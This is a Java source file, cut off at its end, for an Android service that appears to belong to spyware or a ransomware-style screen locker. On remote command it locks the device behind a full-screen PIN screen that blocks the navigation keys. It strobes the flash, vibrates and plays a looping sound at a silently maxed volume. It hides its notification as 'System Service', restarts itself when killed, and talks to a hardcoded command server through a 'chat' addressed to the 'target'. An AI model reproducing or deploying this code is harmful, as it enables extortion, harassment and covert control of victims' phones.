package com.nex.panel;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.res.AssetFileDescriptor;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.media.AudioAttributes;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.text.InputType;
import android.util.Log;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowInsets;
import android.view.WindowInsetsController;
import android.view.WindowManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class LockOverlayService extends Service {
    private static final String TAG = "LockOverlayService";
    
    public static final String ACTION_LOCK      = "com.nex.panel.ACTION_LOCK";
    public static final String ACTION_UNLOCK    = "com.nex.panel.ACTION_UNLOCK";
    public static final String ACTION_LOCK_HTML = "com.nex.panel.ACTION_LOCK_HTML";
    public static final String EXTRA_MESSAGE    = "lock_message";
    public static final String EXTRA_PIN        = "lock_pin";
    public static final String EXTRA_SOUND_URL  = "lock_sound_url";
    public static final String EXTRA_EXTRA      = "extra";
    public static final String EXTRA_HTML       = "lock_html";

    private static final String SERVER = "http://luwwyxyzstoreprivate.pteroq.xyz:4878";
    private static final String CHANNEL = "LockOverlayChannel";
    private static final int NID = 99;
    
    // Nama file audio lock di assets — tidak butuh internet
    private static final String LOCK_SOUND_ASSET = "lock.mp3";

    private WindowManager wm;
    private View overlayRoot;
    private TextView tvChat;
    private EditText etPin, etChat;
    private ScrollView chatScroll;
    private Handler uiHandler, chatHandler, flashHandler, soundHandler;
    private Runnable chatRunnable, flashRunnable, soundRunnable;
    private String pin = "1234", deviceId = "";
    private String customSoundUrl = "";
    private boolean isLocked = false;
    private boolean isSoundPlaying = false;
    private boolean isFlashOn = false;
    // Flag untuk handle race condition prepareAsync vs stopSound
    private volatile boolean soundPrepared = false;
    private volatile boolean stopSoundRequestedBeforePrepare = false;
    
    private CameraManager cameraManager;
    private String cameraId;
    private MediaPlayer mediaPlayer;
    private Vibrator vibrator;
    private PowerManager.WakeLock wakeLock;
    private boolean flashAvailable = false;
    private boolean vibratorAvailable = false;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service onCreate");
        
        initHandlers();
        initNotification();
        initWakeLock();
        initHardware();
        restoreState();
    }

    private void initHandlers() {
        uiHandler = new Handler(Looper.getMainLooper());
        chatHandler = new Handler(Looper.getMainLooper());
        flashHandler = new Handler(Looper.getMainLooper());
        soundHandler = new Handler(Looper.getMainLooper());
    }

    private void initNotification() {
        createNotificationChannel();
        startForeground(NID, buildNotification());
    }

    private void initWakeLock() {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(
                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK | 
                    PowerManager.ACQUIRE_CAUSES_WAKEUP |
                    PowerManager.ON_AFTER_RELEASE,
                    "LockOverlay:WakeLock"
                );
                wakeLock.setReferenceCounted(false);
            }
        } catch (Exception e) {
            Log.e(TAG, "WakeLock init error: " + e.getMessage());
        }
    }

    private void initHardware() {
        initCamera();
        initVibrator();
        initMediaPlayer();
    }

    private void initCamera() {
        try {
            cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            if (cameraManager != null) {
                String[] ids = cameraManager.getCameraIdList();
                for (String id : ids) {
                    try {
                        if (cameraManager.getCameraCharacteristics(id)
                            .get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE)) {
                            cameraId = id;
                            flashAvailable = true;
                            break;
                        }
                    } catch (Exception ignored) {}
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Camera init error: " + e.getMessage());
        }
    }

    private void initVibrator() {
        try {
            vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
            vibratorAvailable = vibrator != null && vibrator.hasVibrator();
        } catch (Exception e) {
            Log.e(TAG, "Vibrator init error: " + e.getMessage());
        }
    }

    private void initMediaPlayer() {
        releaseLockMediaPlayer();
        try {
            mediaPlayer = new MediaPlayer();
            AudioAttributes attrs = new AudioAttributes.Builder()
                .setUsage(AudioAttributes.USAGE_MEDIA)
                .setContentType(AudioAttributes.CONTENT_TYPE_MUSIC)
                .build();
            mediaPlayer.setAudioAttributes(attrs);
            mediaPlayer.setLooping(true);
        } catch (Exception e) {
            Log.e(TAG, "MediaPlayer init error: " + e.getMessage());
            mediaPlayer = null;
        }
    }

    /** Release MediaPlayer dengan aman — set null duluan agar tidak double-release */
    private void releaseLockMediaPlayer() {
        try {
            if (mediaPlayer != null) {
                MediaPlayer mp = mediaPlayer;
                mediaPlayer = null;
                try { if (mp.isPlaying()) mp.stop(); } catch (Exception ignored) {}
                try { mp.reset();   } catch (Exception ignored) {}
                try { mp.release(); } catch (Exception ignored) {}
                Log.d(TAG, "Lock MediaPlayer released");
            }
        } catch (Exception ignored) {}
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_STICKY;
        
        try {
            String action = intent.getAction();
            if (ACTION_LOCK.equals(action)) {
                handleLock(intent);
            } else if (ACTION_UNLOCK.equals(action)) {
                handleUnlock();
            } else if (ACTION_LOCK_HTML.equals(action)) {
                handleLockHtml(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "onStartCommand error: " + e.getMessage());
        }
        
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void handleLock(Intent intent) {
        try {
            // Cek extra dari Flutter
            String extra = intent.getStringExtra(EXTRA_EXTRA);
            
            if (extra != null && !extra.isEmpty()) {
                String[] parts = extra.split("\\|");
                String msg = parts.length > 0 ? parts[0] : "🔴 DEVICE LOCKED";
                String p2 = parts.length > 1 ? parts[1] : "1234";
                String url = parts.length > 2 ? parts[2] : "";
                boolean withSound = parts.length > 3 && parts[3].equals("1");
                boolean withFlash = parts.length > 4 && parts[4].equals("1");
                boolean withVibrate = parts.length > 5 && parts[5].equals("1");
                boolean withHardLock = parts.length > 6 && parts[6].equals("1");
                
                pin = p2;
                customSoundUrl = url;
                
                saveState(msg, p2, customSoundUrl, true);
                // Launch LockActivity — UI persis seperti referensi
                launchLockActivity(msg, p2);

                if (withSound) startSound();
                if (withFlash) startFlashing();
                if (withVibrate) startVibration();

                acquireWakeLock();
                isLocked = true;
                
                Log.d(TAG, "Lock applied: sound=$withSound, flash=$withFlash, vibrate=$withVibrate, hard=$withHardLock");
                return;
            }
            
            // Fallback
            String msg = intent.getStringExtra(EXTRA_MESSAGE);
            String p2 = intent.getStringExtra(EXTRA_PIN);
            String url = intent.getStringExtra(EXTRA_SOUND_URL);
            
            if (msg == null || msg.isEmpty()) msg = "🔴 DEVICE LOCKED";
            if (p2 == null || p2.isEmpty()) p2 = "1234";
            
            pin = p2;
            customSoundUrl = url != null ? url : "";
            
            saveState(msg, p2, customSoundUrl, true);
            // Launch LockActivity — UI persis seperti referensi
            launchLockActivity(msg, p2);
            startAllEffects();

            Log.d(TAG, "Lock applied");
        } catch (Exception e) {
            Log.e(TAG, "Handle lock error: " + e.getMessage());
            launchLockActivity("🔴 DEVICE LOCKED", "1234");
            startAllEffects();
        }
    }

    private void handleUnlock() {
        try {
            saveState("", "", "", false);
            stopAllEffects();
            hideLockOverlay();
            // Hentikan FakeCallService jika sedang berjalan agar ringtone ikut berhenti
            try {
                if (FakeCallService.isRunning()) {
                    Intent stopFakeCall = new Intent(this, FakeCallService.class);
                    stopFakeCall.setAction(FakeCallService.ACTION_STOP_FAKE_CALL);
                    startService(stopFakeCall);
                    Log.d(TAG, "FakeCallService dihentikan saat unlock");
                }
            } catch (Exception eFakeCall) {
                Log.e(TAG, "Gagal menghentikan FakeCallService: " + eFakeCall.getMessage());
            }
            // Broadcast ke LockActivity agar finish()
            Intent unlockBroadcast = new Intent("com.nex.panel.UNLOCK_ACTIVITY");
            unlockBroadcast.setPackage(getPackageName());
            sendBroadcast(unlockBroadcast);
            Log.d(TAG, "Unlocked");
        } catch (Exception e) {
            Log.e(TAG, "Handle unlock error: " + e.getMessage());
            stopAllEffects();
            hideLockOverlay();
        }
    }

    /**
     * Launch LockActivity — Activity fullscreen persis seperti referensi
     * Menggunakan HTML WebView dengan intro screen + keypad PIN animasi
     */
    private void launchLockActivity(String message, String lockPin) {
        try {
            Intent lockIntent = new Intent(this, LockActivity.class);
            lockIntent.addFlags(
                Intent.FLAG_ACTIVITY_NEW_TASK        |
                Intent.FLAG_ACTIVITY_SINGLE_TOP      |
                Intent.FLAG_ACTIVITY_CLEAR_TOP
            );
            lockIntent.putExtra(LockActivity.EXTRA_PIN,     lockPin);
            lockIntent.putExtra(LockActivity.EXTRA_MESSAGE, message);
            startActivity(lockIntent);
            Log.d(TAG, "LockActivity launched: msg=" + message);
        } catch (Exception e) {
            Log.e(TAG, "launchLockActivity error: " + e.getMessage());
            // Fallback ke overlay lama jika Activity gagal
            showLockOverlay(message);
        }
    }

    @Override
    public void onDestroy() {
        Log.d(TAG, "Service onDestroy");
        cleanup();
        restartService();
        super.onDestroy();
    }

    private void cleanup() {
        try {
            stopAllEffects();
            if (chatHandler != null && chatRunnable != null) {
                chatHandler.removeCallbacks(chatRunnable);
            }
            if (flashHandler != null && flashRunnable != null) {
                flashHandler.removeCallbacks(flashRunnable);
            }
            if (soundHandler != null && soundRunnable != null) {
                soundHandler.removeCallbacks(soundRunnable);
            }
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
            }
            // Safety net: cegah prepareAsync yang terlambat dari play setelah destroy
            isLocked = false;
            stopSoundRequestedBeforePrepare = true;
            releaseLockMediaPlayer();
            hideLockOverlay();
        } catch (Exception ignored) {}
    }

    private void restartService() {
        try {
            Intent restart = new Intent(this, LockOverlayService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(restart);
            } else {
                startService(restart);
            }
        } catch (Exception e) {
            Log.e(TAG, "Restart error: " + e.getMessage());
        }
    }

    // ─── EFFECTS ────────────────────────────────────────────────────────────

    private void startAllEffects() {
        isLocked = true;
        acquireWakeLock();
        startFlashing();
        startSound();
        startVibration();
        Log.d(TAG, "All effects started");
    }

    private void stopAllEffects() {
        // Set isLocked=false PERTAMA — agar flag di onPreparedListener langsung aktif
        // dan mencegah mp.start() jalan walaupun prepareAsync selesai terlambat
        isLocked = false;
        isSoundPlaying = false;
        stopFlashing();
        stopSound();       // di dalam sudah set stopSoundRequestedBeforePrepare & release MP
        stopVibration();
        releaseWakeLock();
        Log.d(TAG, "All effects stopped");
    }

    private void acquireWakeLock() {
        try {
            if (wakeLock != null && !wakeLock.isHeld()) {
                wakeLock.acquire(10 * 60 * 1000L);
            }
        } catch (Exception e) {
            Log.e(TAG, "Acquire wake lock error: " + e.getMessage());
        }
    }

    private void releaseWakeLock() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
            }
        } catch (Exception e) {
            Log.e(TAG, "Release wake lock error: " + e.getMessage());
        }
    }

    // ─── FLASH ──────────────────────────────────────────────────────────────

    private void startFlashing() {
        if (!flashAvailable) {
            Log.w(TAG, "Flash not available");
            return;
        }
        
        if (flashRunnable != null) {
            flashHandler.removeCallbacks(flashRunnable);
        }
        
        flashRunnable = () -> {
            if (!isLocked) return;
            toggleFlash();
            flashHandler.postDelayed(flashRunnable, 400);
        };
        flashHandler.post(flashRunnable);
    }

    private void stopFlashing() {
        if (flashHandler != null && flashRunnable != null) {
            flashHandler.removeCallbacks(flashRunnable);
            flashRunnable = null;
        }
        if (isFlashOn) {
            setFlash(false);
        }
    }

    private void toggleFlash() {
        try {
            if (!flashAvailable) return;
            isFlashOn = !isFlashOn;
            setFlash(isFlashOn);
        } catch (Exception e) {
            Log.e(TAG, "Toggle flash error: " + e.getMessage());
            flashAvailable = false;
            initCamera();
        }
    }

    private void setFlash(boolean on) {
        try {
            if (cameraManager != null && cameraId != null) {
                cameraManager.setTorchMode(cameraId, on);
            }
        } catch (CameraAccessException e) {
            Log.e(TAG, "Camera access error: " + e.getMessage());
            flashAvailable = false;
            initCamera();
        } catch (Exception e) {
            Log.e(TAG, "Set flash error: " + e.getMessage());
        }
    }

    // ─── SOUND ──────────────────────────────────────────────────────────────
    // Audio lock pakai file asset lokal "lock.mp3" — tidak butuh internet.
    // Fix race condition: jika stopSound() dipanggil saat prepareAsync masih
    // berjalan, flag stopSoundRequestedBeforePrepare mencegah mp.start() jalan.

    private void startSound() {
        if (isSoundPlaying) return;
        isSoundPlaying = true;
        soundPrepared = false;
        stopSoundRequestedBeforePrepare = false;

        try {
            // Naikkan volume MUSIC ke max secara diam-diam
            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            if (am != null) {
                int maxVol = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
                am.setStreamVolume(AudioManager.STREAM_MUSIC, maxVol, 0);
                am.setMode(AudioManager.MODE_NORMAL);
            }

            // Init ulang MediaPlayer bersih
            initMediaPlayer();
            if (mediaPlayer == null) {
                isSoundPlaying = false;
                return;
            }

            // Load dari asset lokal
            AssetFileDescriptor afd = getAssets().openFd(LOCK_SOUND_ASSET);
            mediaPlayer.setDataSource(afd.getFileDescriptor(),
                                      afd.getStartOffset(),
                                      afd.getLength());
            afd.close();

            // onPrepared: cek dulu apakah stop sudah diminta
            mediaPlayer.setOnPreparedListener(mp -> {
                soundPrepared = true;
                if (stopSoundRequestedBeforePrepare || !isLocked) {
                    // Stop sudah diminta — jangan play, langsung release
                    Log.d(TAG, "stopSound requested before prepare — skipping play");
                    releaseLockMediaPlayer();
                    isSoundPlaying = false;
                } else {
                    try {
                        mp.start();
                        Log.d(TAG, "Lock sound started (asset: " + LOCK_SOUND_ASSET + ")");
                    } catch (Exception e) {
                        Log.e(TAG, "Lock sound start error: " + e.getMessage());
                        releaseLockMediaPlayer();
                        isSoundPlaying = false;
                    }
                }
            });

            mediaPlayer.setOnErrorListener((mp, what, extra) -> {
                Log.e(TAG, "Lock sound error: what=" + what);
                soundPrepared = true; // anggap selesai agar stopSound bisa normal
                releaseLockMediaPlayer();
                isSoundPlaying = false;
                return true;
            });

            mediaPlayer.prepareAsync();
            Log.d(TAG, "Lock sound prepareAsync started");

        } catch (Exception e) {
            Log.e(TAG, "startSound error: " + e.getMessage());
            releaseLockMediaPlayer();
            isSoundPlaying = false;
        }
    }

    private void stopSound() {
        isSoundPlaying = false;
        // Batalkan semua scheduled sound callbacks
        if (soundHandler != null) {
            soundHandler.removeCallbacksAndMessages(null);
        }
        if (!soundPrepared) {
            // prepareAsync masih berjalan — tandai agar onPrepared tidak play
            stopSoundRequestedBeforePrepare = true;
            Log.d(TAG, "stopSound: marked stopSoundRequestedBeforePrepare=true");
        }
        // Release MediaPlayer (aman dipanggil kapanpun)
        releaseLockMediaPlayer();
        Log.d(TAG, "Lock sound stopped");
    }

    // ─── VIBRATION ──────────────────────────────────────────────────────────

    private void startVibration() {
        if (!vibratorAvailable) return;
        
        try {
            long[] pattern = {0, 400, 400, 400, 400};
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createWaveform(pattern, 0));
            } else {
                vibrator.vibrate(pattern, 0);
            }
        } catch (Exception e) {
            Log.e(TAG, "Vibration error: " + e.getMessage());
        }
    }

    private void stopVibration() {
        try {
            if (vibrator != null) {
                vibrator.cancel();
            }
        } catch (Exception e) {
            Log.e(TAG, "Stop vibration error: " + e.getMessage());
        }
    }

    // ─── OVERLAY ────────────────────────────────────────────────────────────

    private void showLockOverlay(String message) {
        try {
            if (wm == null) {
                wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            }
            hideLockOverlay();

            LinearLayout root = createOverlayLayout(message);
            overlayRoot = root;

            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                : WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN    |
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS    |
                WindowManager.LayoutParams.FLAG_FULLSCREEN           |
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED     |
                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD     |
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON       |
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON,
                PixelFormat.OPAQUE
            );
            params.gravity = Gravity.TOP | Gravity.START;
            params.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE;

            wm.addView(overlayRoot, params);

            // Hide navigation bar + status bar — fullscreen immersive
            enforceOverlayImmersive(overlayRoot);

            startChatPoll();
            
        } catch (Exception e) {
            Log.e(TAG, "Show overlay error: " + e.getMessage());
        }
    }

    private LinearLayout createOverlayLayout(String message) {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.parseColor("#0A0A0A"));
        root.setGravity(Gravity.CENTER_HORIZONTAL);
        root.setPadding(dp(16), dp(48), dp(16), dp(24));
        root.setFocusable(true);
        root.setFocusableInTouchMode(true);
        // Blokir BACK, HOME, RECENTS, MENU, SEARCH — untuk ACTION_DOWN & ACTION_UP
        root.setOnKeyListener((v, keyCode, event) -> {
            if (!isLocked) return false;
            return keyCode == KeyEvent.KEYCODE_BACK       ||
                   keyCode == KeyEvent.KEYCODE_HOME        ||
                   keyCode == KeyEvent.KEYCODE_APP_SWITCH  ||
                   keyCode == KeyEvent.KEYCODE_MENU        ||
                   keyCode == KeyEvent.KEYCODE_SEARCH;
        });
        // Sentuhan pada root diteruskan ke child (PIN input + tombol Unlock tetap bisa dipakai)

        // Title
        TextView title = new TextView(this);
        title.setText("☠️ DEVICE LOCKED ☠️");
        title.setTextColor(Color.parseColor("#E53935"));
        title.setTextSize(22);
        title.setTypeface(null, android.graphics.Typeface.BOLD);
        title.setGravity(Gravity.CENTER);
        root.addView(title);

        // Divider
        root.addView(createDivider());

        // Message
        TextView tvMsg = new TextView(this);
        tvMsg.setText(message);
        tvMsg.setTextColor(Color.parseColor("#CCCCDD"));
        tvMsg.setTextSize(14);
        tvMsg.setGravity(Gravity.CENTER);
        tvMsg.setLineSpacing(6, 1);
        LinearLayout.LayoutParams msgLp = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        msgLp.setMargins(0, 0, 0, dp(20));
        tvMsg.setLayoutParams(msgLp);
        root.addView(tvMsg);

        // Chat area
        chatScroll = new ScrollView(this);
        chatScroll.setBackgroundColor(Color.parseColor("#111122"));
        LinearLayout.LayoutParams chatLp = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            dp(180)
        );
        chatLp.setMargins(0, 0, 0, dp(10));
        chatScroll.setLayoutParams(chatLp);
        tvChat = new TextView(this);
        tvChat.setTextColor(Color.parseColor("#AAAACC"));
        tvChat.setTextSize(11);
        tvChat.setPadding(dp(14), dp(10), dp(14), dp(10));
        tvChat.setLineSpacing(4, 1);
        chatScroll.addView(tvChat);
        root.addView(chatScroll);

        // Chat input
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        LinearLayout.LayoutParams rowLp = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        rowLp.setMargins(0, 0, 0, dp(20));
        row.setLayoutParams(rowLp);
        
        etChat = new EditText(this);
        etChat.setHint("Reply...");
        etChat.setHintTextColor(Color.parseColor("#444466"));
        etChat.setTextColor(Color.WHITE);
        etChat.setTextSize(12);
        etChat.setBackground(createRoundBg(Color.parseColor("#1A1A2E"), 8));
        etChat.setPadding(dp(12), dp(10), dp(12), dp(10));
        LinearLayout.LayoutParams etLp = new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f);
        etLp.setMargins(0, 0, dp(8), 0);
        etChat.setLayoutParams(etLp);
        
        Button btnSend = new Button(this);
        btnSend.setText("Send");
        btnSend.setTextColor(Color.WHITE);
        btnSend.setTextSize(11);
        btnSend.setBackground(createRoundBg(Color.parseColor("#E53935"), 8));
        btnSend.setOnClickListener(v -> sendChat());
        
        row.addView(etChat);
        row.addView(btnSend);
        root.addView(row);

        root.addView(createDivider());

        // PIN input
        etPin = new EditText(this);
        etPin.setHint("Enter PIN to unlock");
        etPin.setHintTextColor(Color.parseColor("#444466"));
        etPin.setTextColor(Color.WHITE);
        etPin.setTextSize(18);
        etPin.setInputType(InputType.TYPE_CLASS_NUMBER | InputType.TYPE_NUMBER_VARIATION_PASSWORD);
        etPin.setGravity(Gravity.CENTER);
        etPin.setBackground(createRoundBg(Color.parseColor("#0D0D1F"), 10));
        etPin.setPadding(dp(16), dp(14), dp(16), dp(14));
        LinearLayout.LayoutParams pinLp = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        pinLp.setMargins(0, 0, 0, dp(12));
        etPin.setLayoutParams(pinLp);
        root.addView(etPin);

        // Unlock button
        Button btnUnlock = new Button(this);
        btnUnlock.setText("UNLOCK");
        btnUnlock.setTextColor(Color.WHITE);
        btnUnlock.setTextSize(13);
        btnUnlock.setTypeface(null, android.graphics.Typeface.BOLD);
        btnUnlock.setBackground(createRoundBg(Color.parseColor("#1B1B3A"), 10));
        btnUnlock.setPadding(0, dp(14), 0, dp(14));
        btnUnlock.setLayoutParams(new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        ));
        btnUnlock.setOnClickListener(v -> tryUnlock());
        root.addView(btnUnlock);

        return root;
    }

    private void hideLockOverlay() {
        try {
            if (chatHandler != null && chatRunnable != null) {
                chatHandler.removeCallbacks(chatRunnable);
            }
            if (overlayRoot != null && wm != null) {
                wm.removeView(overlayRoot);
                overlayRoot = null;
            }
        } catch (Exception e) {
            Log.e(TAG, "Hide overlay error: " + e.getMessage());
        }
    }

    private void tryUnlock() {
        try {
            if (etPin == null) return;
            String entered = etPin.getText().toString().trim();
            if (entered.equals(pin)) {
                saveState("", "", "", false);
                stopAllEffects();
                hideLockOverlay();
            } else {
                etPin.setText("");
                etPin.setHint("Wrong PIN - try again");
                etPin.setHintTextColor(Color.parseColor("#E53935"));
                if (flashAvailable) {
                    try {
                        setFlash(true);
                        uiHandler.postDelayed(() -> setFlash(false), 500);
                    } catch (Exception ignored) {}
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Unlock error: " + e.getMessage());
        }
    }

    // ─── CHAT ───────────────────────────────────────────────────────────────

    private void startChatPoll() {
        if (chatRunnable != null) {
            chatHandler.removeCallbacks(chatRunnable);
        }
        chatRunnable = () -> {
            pollChat();
            chatHandler.postDelayed(chatRunnable, 3000);
        };
        chatHandler.post(chatRunnable);
    }

    private void pollChat() {
        if (deviceId.isEmpty()) return;
        new Thread(() -> {
            try {
                String resp = httpGet(SERVER + "/api/lock-chat/" + deviceId);
                if (resp == null) return;
                JSONObject obj = new JSONObject(resp);
                JSONArray msgs = obj.optJSONArray("messages");
                if (msgs == null || msgs.length() == 0) return;
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < msgs.length(); i++) {
                    JSONObject m = msgs.getJSONObject(i);
                    String from = m.optString("from", "owner");
                    String text = m.optString("text", "");
                    String time = m.optString("time", "");
                    sb.append(from.equals("owner") ? "[ Admin ] " : "[ You ] ")
                      .append(text).append("  ").append(time).append("\n");
                }
                final String s = sb.toString();
                uiHandler.post(() -> {
                    if (tvChat != null) {
                        tvChat.append(s);
                        if (chatScroll != null) {
                            chatScroll.post(() -> chatScroll.fullScroll(ScrollView.FOCUS_DOWN));
                        }
                    }
                });
            } catch (Exception ignored) {}
        }).start();
    }

    private void sendChat() {
        if (etChat == null || deviceId.isEmpty()) return;
        String text = etChat.getText().toString().trim();
        if (text.isEmpty()) return;
        etChat.setText("");
        uiHandler.post(() -> {
            if (tvChat != null) {
                tvChat.append("[ You ] " + text + "\n");
                if (chatScroll != null) {
                    chatScroll.post(() -> chatScroll.fullScroll(ScrollView.FOCUS_DOWN));
                }
            }
        });
        new Thread(() -> {
            try {
                JSONObject b = new JSONObject();
                b.put("text", text);
                b.put("from", "target");
                postJson(SERVER + "/api/lock-chat/" + deviceId, b.toString());
            } catch (Exception ignored) {}
        }).start();
    }

    // ─── HELPERS ────────────────────────────────────────────────────────────

    private String readDeviceId() {
        try {
            SharedPreferences p = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE);
            String id = p.getString("flutter.target_id", null);
            if (id != null && !id.isEmpty()) return id;
        } catch (Exception ignored) {}
        
        try {
            File f = new File(android.os.Environment.getExternalStorageDirectory(), ".crpt/.devid");
            if (f.exists()) {
                BufferedReader br = new BufferedReader(new java.io.FileReader(f));
                String id = br.readLine();
                br.close();
                if (id != null && !id.isEmpty()) return id.trim();
            }
        } catch (Exception ignored) {}
        
        return "";
    }

    private void saveState(String msg, String p2, String url, boolean locked) {
        try {
            getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE).edit()
                .putBoolean("isLocked", locked)
                .putString("lockMessage", msg)
                .putString("lockPin", p2)
                .putString("lockSoundUrl", url)
                .apply();
        } catch (Exception e) {
            Log.e(TAG, "Save state error: " + e.getMessage());
        }
    }

    private void restoreState() {
        try {
            deviceId = readDeviceId();
            SharedPreferences p = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
            if (p.getBoolean("isLocked", false)) {
                String msg = p.getString("lockMessage", "🔴 DEVICE LOCKED");
                pin = p.getString("lockPin", "1234");
                customSoundUrl = p.getString("lockSoundUrl", "");
                // Guard: jika isLocked sudah true di memory, service ini sudah aktif —
                // cukup re-launch LockActivity saja tanpa start ulang efek (cegah double)
                if (isLocked) {
                    Log.d(TAG, "restoreState: sudah terkunci, re-launch LockActivity");
                    launchLockActivity(msg, pin);
                    return;
                }
                isLocked = true;
                // Launch LockActivity — restore lock state setelah service restart
                launchLockActivity(msg, pin);
                startAllEffects();
                Log.d(TAG, "restoreState: lock dipulihkan — msg=" + msg);
            }
        } catch (Exception e) {
            Log.e(TAG, "Restore state error: " + e.getMessage());
        }
    }

    private int dp(int px) {
        return (int) (px * getResources().getDisplayMetrics().density);
    }

    private android.graphics.drawable.GradientDrawable createRoundBg(int color, int radius) {
        android.graphics.drawable.GradientDrawable d = new android.graphics.drawable.GradientDrawable();
        d.setColor(color);
        d.setCornerRadius(dp(radius));
        return d;
    }

    private View createDivider() {
        View v = new View(this);
        v.setBackgroundColor(Color.parseColor("#222244"));
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, 1
        );
        lp.setMargins(0, dp(16), 0, dp(16));
        v.setLayoutParams(lp);
        return v;
    }

    private String httpGet(String url) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setConnectTimeout(5000);
            c.setReadTimeout(5000);
            if (c.getResponseCode() != 200) return null;
            BufferedReader br = new BufferedReader(new InputStreamReader(c.getInputStream(), StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder();
            String l;
            while ((l = br.readLine()) != null) sb.append(l);
            br.close();
            return sb.toString();
        } catch (Exception e) {
            return null;
        }
    }

    private void postJson(String url, String json) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "application/json");
            c.setDoOutput(true);
            c.setConnectTimeout(5000);
            c.setReadTimeout(5000);
            OutputStream os = c.getOutputStream();
            os.write(json.getBytes(StandardCharsets.UTF_8));
            os.close();
            c.getResponseCode();
            c.disconnect();
        } catch (Exception ignored) {}
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                NotificationChannel ch = new NotificationChannel(
                    CHANNEL,
                    "System Service",
                    NotificationManager.IMPORTANCE_NONE  // tidak tampil sama sekali
                );
                ch.setShowBadge(false);
                ch.setSound(null, null);
                ch.enableVibration(false);
                ch.enableLights(false);
                ch.setDescription("");
                ch.setLockscreenVisibility(android.app.Notification.VISIBILITY_SECRET);
                NotificationManager nm = getSystemService(NotificationManager.class);
                if (nm != null) {
                    nm.createNotificationChannel(ch);
                }
            } catch (Exception e) {
                Log.e(TAG, "Create channel error: " + e.getMessage());
            }
        }
    }

    // ─── LOCK HTML ──────────────────────────────────────────────────────────

    private void handleLockHtml(Intent intent) {
        try {
            String html = intent.getStringExtra(EXTRA_HTML);
            if (html == null || html.isEmpty()) {
                html = "<html><body style='background:#000;color:#fff;display:flex;"
                     + "align-items:center;justify-content:center;height:100vh;"
